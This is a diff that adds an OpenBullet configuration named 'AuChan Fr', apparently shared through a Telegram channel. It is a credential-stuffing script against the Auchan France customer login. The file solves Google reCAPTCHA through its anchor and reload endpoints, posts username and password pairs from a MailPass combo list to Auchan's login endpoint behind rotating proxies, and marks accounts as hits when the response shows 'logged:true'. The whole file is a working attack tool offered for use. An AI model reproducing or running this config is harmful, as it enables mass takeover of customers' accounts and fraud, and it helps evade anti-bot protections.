@@ -1,0 +1,134 @@
+[SETTINGS]
+{
+  "Name": "AuChan Fr",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2021-06-20T18:14:16.0708024+04:30",
+  "AdditionalInfo": "Telegram Channel: https://t.me/OpenBulletChannel",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor",
+      "VariableName": "",
+      "Id": 273977926
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get REQUEST GET "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LdahqcUAAAAAO0QdBWvRj6vGxSS8zCTVvmKsCoZ&co=aHR0cHM6Ly9jb21wdGUuYXVjaGFuLmZyOjQ0Mw..&hl=en&v=a7xT2d71Jli62wQMfeUUrLcO&size=invisible&cb=wskua2au9hzj" 
+  
+  HEADER "Host: www.google.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "X-Client-Data: CJO2yQEIo7bJAQjEtskBCKmdygEI+MfKAQiymssBCOScywEIqJ3LAQ==" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Dest: iframe" 
+  HEADER "Referer: https://compte.auchan.fr/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#Token PARSE "<SOURCE>" LR "id=\"recaptcha-token\" value=\"" "\"" -> VAR "Token" 
+
+#POST REQUEST POST "https://www.google.com/recaptcha/api2/reload?k=6LdahqcUAAAAAO0QdBWvRj6vGxSS8zCTVvmKsCoZ" 
+  CONTENT "a7xT2d71Jli62wQMfeUUrLcO&reason=q&c=<Token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.google.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 5119" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36" 
+  HEADER "Content-Type: application/x-protobuffer" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://www.google.com" 
+  HEADER "X-Client-Data: CJO2yQEIo7bJAQjEtskBCKmdygEI+MfKAQiymssBCOScywEIqJ3LAQ==" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LdahqcUAAAAAO0QdBWvRj6vGxSS8zCTVvmKsCoZ&co=aHR0cHM6Ly9jb21wdGUuYXVjaGFuLmZyOjQ0Mw..&hl=en&v=a7xT2d71Jli62wQMfeUUrLcO&size=invisible&cb=g12bkdb9tqk8" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#Rresp PARSE "<SOURCE>" LR "rresp\",\"" "\"" -> VAR "Rresp" 
+
+#Login REQUEST POST "https://www.auchan.fr/checkout/j_spring_security_check" 
+  CONTENT "j_username=<USER>&j_password=<PASS>&g-recaptcha-response=<Rresp>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: compte.auchan.fr" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://compte.auchan.fr" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://compte.auchan.fr/auth/realms/auchan.fr/login-actions/authenticate?execution=12522bec-d7b9-48ee-91fe-a9ffd16a246c&client_id=ccc&tab_id=Ryarj4tZZ7g" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#Get REQUEST GET "https://www.auchan.fr/sso/status" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Connection: keep-alive" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "logged\":true" 
+  KEYCHAIN Failure OR 
+    KEY "logged\":false" 
+
+#Telegram_Channel FUNCTION Constant "https://t.me/OpenBulletChannel" -> CAP "Telegram Channel" 
+
